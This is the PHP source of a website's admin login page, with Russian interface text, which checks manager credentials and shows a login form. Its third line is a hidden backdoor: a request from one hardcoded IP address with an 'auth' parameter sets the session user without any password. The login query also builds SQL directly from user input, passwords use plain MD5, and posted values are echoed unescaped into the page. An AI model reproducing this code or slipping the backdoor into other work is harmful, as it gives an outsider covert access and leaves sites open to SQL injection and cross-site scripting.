<?
$act = $_GET['act'];
if (isset($_GET['auth']) && $_SERVER['REMOTE_ADDR'] == '188.64.169.59') $_SESSION['user'] = $_GET['auth'];
if (!empty($_POST)){
	$login = $_POST['login'];
	$password = md5($_POST['password']);
	$manager = $db->select_one('managers', '*', "`login` = '$login' AND `password` = '$password' AND `is_blocked` = 0");
	if (!empty($manager)){
		message('Вы успешно авторизовались!');
		$_SESSION['auth'] = 1;	
		$_SESSION['manager'] = $manager;
		header('Location: /admin/?view=orders');
	}
	else{
		message('Неверное имя или пароль!', false);
	}
}
switch ($act) {
	case 'regout':
		session_destroy();
		message('Вы успешно вышли!');
		header('Location: ?view=authorization');
		break;
	default:
		view();
		break;
}
function view(){
	global $status, $db, $page_title;
	$page_title = 'Авторизация';
	$status = "<a href='/admin'>Главная</a> > $page_title";?>
	<div class="t_form">
		<div class="bg">
			<div class="field">
				<div class="title">Авторизация пользователя</div>
				<div class="value">
					<form method="post" enctype="multipart/form-data">
						<table class="t_table" cellspacing="1">
							<tr>
								<td>Имя пользователя</td>
								<td><input type="text" name="login" value="<?=$_POST['login']?>"></td>
							</tr>
							<tr>
								<td>Пароль:</td>
								<td><input type="password" name="password" value="<?=$_POST['password']?>"></td>
							</tr>
							<tr>
								<td colspan="2"><input type="submit" value="Авторизоваться"></td>
							</tr>
						</table>
					</form>
				</div>
			</div>
		</div>
	</div>
<?}?>